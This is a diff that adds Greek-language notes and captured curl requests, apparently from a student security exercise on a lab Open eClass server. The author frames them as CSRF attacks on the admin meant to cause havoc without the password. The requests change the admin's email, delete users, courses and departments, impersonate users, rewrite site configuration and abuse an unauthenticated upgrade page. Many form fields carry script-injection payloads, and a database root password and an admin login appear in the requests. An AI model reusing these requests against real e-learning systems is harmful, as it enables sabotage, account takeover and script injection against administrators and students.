@@ -1,0 +1,132 @@
+νοζιζω αυτες ειναι ολες οι επιθέσεις που μπορουμε να κανουμε στον admin με CSRF
+πολλά απο αυτά μπορεί να ειναι περρητά αιτήματα
+προφανώς μπορούμε να αλλάξουμε τις τιμές των παραμέτρων για XSS
+Ακόμα και αν δεν καταφέρουμε να πάρουμε τον κωδικο του admin
+απλα μπορούμε να διμιουργίσουμε αναταραχή στην βαση διαγράφοντας τους χρηστες, φτιάχνοντας άπειρα μαθήματα κτλ
+ουσιαστικά ακόμα και χωρίς να έχουμε τον κωδικό θα είναι σαν να έχουμε όλα τα δικαιώματα  
+
+//-----------------------------------------ALAGI MAIL KE USER NAME ADMIN
+
+curl 'http://192.168.1.6/modules/profile/profile.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/index.php' -H 'Cookie: PHPSESSID=363klr40ighr17ulm0pqo76fe1' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/profile/profile.php?submit=yes' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/profile/profile.php?msg=6' -H 'Cookie: PHPSESSID=363klr40ighr17ulm0pqo76fe1' -H 'Upgrade-Insecure-Requests: 1' --data 'prenom_form=%CE%94%CE%B9%CE%B1%CF%87%CE%B5%CE%B9%CF%81%CE%B9%CF%83%CF%84%CE%AE%CF%82&nom_form=%CE%A0%CE%BB%CE%B1%CF%84%CF%86%CF%8C%CF%81%CE%BC%CE%B1%CF%82&username_form=admin&email_form=yo%40localhost.com&am_form=&persoStatus=yes&userLanguage=el&submit=%CE%91%CE%BB%CE%BB%CE%B1%CE%B3%CE%AE'
+
+
+//-----------------------------------------DIMIOURGIA MA8IMATOS APO ADMIN
+
+curl 'http://192.168.1.6/modules/create_course/create_course.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/include/xinha/modules/ColorPicker/ColorPicker.js' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/create_course/create_course.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955'
+
+curl 'http://192.168.1.6/modules/create_course/create_course.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/create_course/create_course.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1' --data 'intitule=<script>alert("titlos")</script>&faculte=1&titulaires=<script>alert("ekpedeftes")</script>&type=pre&languageCourse=el&visit=true&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&description=<script>alert("perigrafi")</script>%0D%0A%0D%0A&course_keywords=<script>alert("le3isKlidia")</script>&course_addon=<script>alert("simpliromatikaStixia")</script>&create3=%CE%95%CF%80%CF%8C%CE%BC%CE%B5%CE%BD%CE%BF+%CE%B2%CE%AE%CE%BC%CE%B1+%3E'
+
+curl 'http://192.168.1.6/modules/create_course/create_course.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/create_course/create_course.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1' --data 'intitule=<script>alert("titlos")</script>&faculte=1&titulaires=<script>alert("ekpedeftes")</script>&type=pre&languageCourse=el&description=<script>alert("perigrafi")</script>%0D%0A%0D%0A&course_addon=<script>alert("simpliromatikaStixia")</script>&course_keywords=<script>alert("le3isKlidia")</script>&visit=true&formvisible=2&password=<script>alert("kodikos")</script>&subsystems%5B%5D=1&create_course=%CE%94%CE%B7%CE%BC%CE%B9%CE%BF%CF%85%CF%81%CE%B3%CE%AF%CE%B1+%CE%BC%CE%B1%CE%B8%CE%AE%CE%BC%CE%B1%CF%84%CE%BF%CF%82%21'
+
+
+//-----------------------------------------DIAGRAFI XRISTI APO ADMIN
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/listusers.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/unreguser.php?u=571' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/listusers.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/unreguser.php?u=571&c=&doit=yes' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/unreguser.php?u=571' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+
+//----------------------------------------- EGGRAFI SE MA8IMA APO ADMIN
+
+curl 'http://192.168.1.6/modules/auth/courses.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/auth/courses.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/auth/courses.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1' --data 'selectCourse%5B%5D=3&changeCourse%5B%5D=3&changeCourse%5B%5D=6&changeCourse%5B%5D=5&submit=%CE%95%CE%B3%CE%B3%CF%81%CE%B1%CF%86%CE%AE'
+
+
+//----------------------------------------- DIAGRAFI APO MA8IMA APO ADMIN
+
+curl 'http://192.168.1.6/modules/auth/courses.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/auth/courses.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/auth/courses.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1' --data 'changeCourse%5B%5D=3&changeCourse%5B%5D=6&changeCourse%5B%5D=5&submit=%CE%95%CE%B3%CE%B3%CF%81%CE%B1%CF%86%CE%AE'
+
+
+//----------------------------------------- SINDESI SAN XRISTIS APO ADMIN
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/change_user.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/listusers.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/change_user.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/change_user.php' -H 'Cookie: PHPSESSID=q95jomgisgj1oa2iv6e9fm4955' -H 'Upgrade-Insecure-Requests: 1' --data 'username=kona'
+
+
+//----------------------------------------- DIAGRAFI MA8IMATOS APO ADMIN
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/index.php' -H 'Cookie: PHPSESSID=u9bf9ahfjjngij3nlnrcgmers5' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/listcours.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/listcours.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/delcours.php?c=TMA105' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/listcours.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/delcours.php?c=TMA105&delete=yes' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/delcours.php?c=TMA105' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+
+//----------------------------------------- DIAGRAFI TMIMATOS APO ADMIN
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/index.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/addfaculte.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/addfaculte.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/addfaculte.php?a=2&c=5' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/addfaculte.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+//----------------------------------------- SYSTEM INFO APO ADMIN (RFI & LFI)
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/index.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/sysinfo/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/sysinfo/index.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1' --data 'template=classic&lng=en'
+
+
+//----------------------------------------- DIAGRAFI TMIMATOS APO ADMIN (RFI & LFI)
+
+curl 'http://192.168.1.6/modules/admin/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/index.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/phpInfo.php?to=phpinfo' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/phpInfo.php?to=phpinfo' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+
+//----------------------------------------- ANABA8MISI BASIS (δεν πρεπει καν να εισαι συνδεδεμενος. αν το config/config.php είανι μονο για αναγνωση αυτο δεν δουλευει)
+
+          curl 'http://192.168.1.6/upgrade/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/phpInfo.php?to=phpinfo' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1'
+
+          curl 'http://192.168.1.6/upgrade/upgrade.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/upgrade/' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1' --data 'login=admin&password=123456&submit_upgrade=%CE%91%CE%BD%CE%B1%CE%B2%CE%AC%CE%B8%CE%BC%CE%B9%CF%83%CE%B7+%CF%84%CF%89%CE%BD+%CE%B2%CE%AC%CF%83%CE%B5%CF%89%CE%BD+%CE%B4%CE%B5%CE%B4%CE%BF%CE%BC%CE%AD%CE%BD%CF%89%CE%BD'
+
+curl 'http://192.168.1.6/upgrade/upgrade.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/upgrade/upgrade.php' -H 'Cookie: PHPSESSID=btjphgqgneqqolni9704l5cij7' -H 'Upgrade-Insecure-Requests: 1' --data 'Institution=%3Cscript%3Ealert%28%22onoma%22%29%3B%3C%2Fscript%3E&postaddress=%3Cscript%3Ealert%28%22dief8insi%22%29%3B%3C%2Fscript%3E&telephone=%3Cscript%3Ealert%28%22til%22%29%3B%3C%2Fscript%3E&fax=%3Cscript%3Ealert%28%22fax%22%29%3B%3C%2Fscript%3E&submit2=%CE%A3%CF%85%CE%BD%CE%AD%CF%87%CE%B5%CE%B9%CE%B1'
+
+η απλά για διαγραφη:
+
+http://192.168.1.6/upgrade/upgrade.php?Institution=%3Cscript%3Ealert%28%22onoma%22%29%3B%3C%2Fscript%3E&postaddress=%3Cscript%3Ealert%28%22dief8insi%22%29%3B%3C%2Fscript%3E&telephone=%3Cscript%3Ealert%28%22til%22%29%3B%3C%2Fscript%3E&fax=%3Cscript%3Ealert%28%22fax%22%29%3B%3C%2Fscript%3E&submit2=%CE%A3%CF%85%CE%BD%CE%AD%CF%87%CE%B5%CE%B9%CE%B1
+
+
+//----------------------------------------- ANAKINOSI APO ADMIN
+
+      curl 'http://192.168.1.6/modules/admin/adminannouncements.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/' -H 'Cookie: PHPSESSID=onu93te4pg0p18fat6o6845p80' -H 'Upgrade-Insecure-Requests: 1'
+
+      curl 'http://192.168.1.6/modules/admin/adminannouncements.php?addAnnouce=11&localize=el' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/adminannouncements.php?delete=4&localize=el' -H 'Cookie: PHPSESSID=onu93te4pg0p18fat6o6845p80' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/adminannouncements.php?localize=el' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/adminannouncements.php?addAnnouce=1&localize=el' -H 'Cookie: PHPSESSID=onu93te4pg0p18fat6o6845p80' -H 'Upgrade-Insecure-Requests: 1' --data 'visible=1&title=%3Cscript%3Ealert%28%22titlos%22%29%3C%2Fscript%3E&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&newContent=%26lt%3Bscript%26gt%3Balert%28%26quot%3Banakinosi%26quot%3B%29%26lt%3B%2Fscript%26gt%3B%0D%0A%0D%0A&comment=%3Cscript%3Ealert%28%22sxolia%22%29%3C%2Fscript%3E&title_en=%3Cscript%3Ealert%28%22titlosagglika%22%29%3C%2Fscript%3E&Dialog11=on&Dialog12=on&Dialog13=on&Dialog14=on&Dialog15=on&Dialog16=on&newContent_en=%26lt%3Bscript%26gt%3Balert%28%26quot%3Banakinosiagglika%26quot%3B%29%26lt%3B%2Fscript%26gt%3B%0D%0A%0D%0A&comment_en=%3Cscript%3Ealert%28%22sxoliaagglika%22%29%3C%2Fscript%3E&submitAnnouncement=%CE%A5%CF%80%CE%BF%CE%B2%CE%BF%CE%BB%CE%AE'
+
+
+//----------------------------------------- ARXIO RI8MISEON ADMIN
+
+      curl 'http://192.168.1.6/modules/admin/eclassconf.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/' -H 'Cookie: PHPSESSID=onu93te4pg0p18fat6o6845p80' -H 'Upgrade-Insecure-Requests: 1'
+
+curl 'http://192.168.1.6/modules/admin/eclassconf.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/eclassconf.php' -H 'Cookie: PHPSESSID=onu93te4pg0p18fat6o6845p80' -H 'Upgrade-Insecure-Requests: 1' --data 'formurlServer=http%3A%2F%2F192.168.1.6%2F&formurlAppend=&formwebDir=%2Fmedia%2Fsf_openeclass%2F&formmysqlServer=localhost&formmysqlUser=root&formmysqlPassword=csec&formmysqlMainDb=eclass&formphpMyAdminURL=..%2Fadmin%2Fmysql%2F&formphpSysInfoURL=..%2Fadmin%2Fsysinfo%2F&formemailAdministrator=webmaster%40localhost&formadministratorName=%CE%94%CE%B9%CE%B1%CF%87%CE%B5%CE%B9%CF%81%CE%B9%CF%83%CF%84%CE%AE%CF%82&formadministratorSurname=%CE%A0%CE%BB%CE%B1%CF%84%CF%86%CF%8C%CF%81%CE%BC%CE%B1%CF%82&formsiteName=Open+eClass&formpostaddress=address&formtelephone=tel&formfax=faxxx&formemailhelpdesk=email&formInstitution=Institution&formInstitutionUrl=http%3A%2F%2Fwww.gunet.gr%2F&formlanguage=greek&formcloseuserregistration=false&formdurationAccount=126144000&backupfile=on&submit=%CE%91%CE%BB%CE%BB%CE%B1%CE%B3%CE%AE'
+
+
+//----------------------------------------- EGGRAFI KA8IGITI KE APODOXI APO ADMIN
+
+EGGRAFI (den xriazete)
+      curl 'http://192.168.1.6/modules/auth/newprof.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.1.6' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/auth/newprof.php' -H 'Cookie: PHPSESSID=7rrnigl330mfpaf3maogaseoh3' -H 'Upgrade-Insecure-Requests: 1' --data 'nom_form=eponimo&prenom_form=onoma&userphone=696969&uname=username&email_form=mail%40mail.com&usercomment=sxolia+ka8igiti&department=1&proflang=el&submit=%CE%A5%CF%80%CE%BF%CE%B2%CE%BF%CE%BB%CE%AE+%CE%91%CE%AF%CF%84%CE%B7%CF%83%CE%B7%CF%82&auth=1'
+
+APODOXI ADMIN (i dimiourgia ka8igiti apo admin)
+      curl 'http://192.168.1.6/modules/admin/listreq.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.1.6/modules/admin/listusers.php' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=s0vaogg0ivfvvn8cf3d9a73q52' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
+
+      curl 'http://192.168.1.6/modules/admin/newuseradmin.php?id=3960' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.1.6/modules/admin/listreq.php' -H 'Cookie: PHPSESSID=s0vaogg0ivfvvn8cf3d9a73q52' -H 'Upgrade-Insecure-Requests: 1'
+
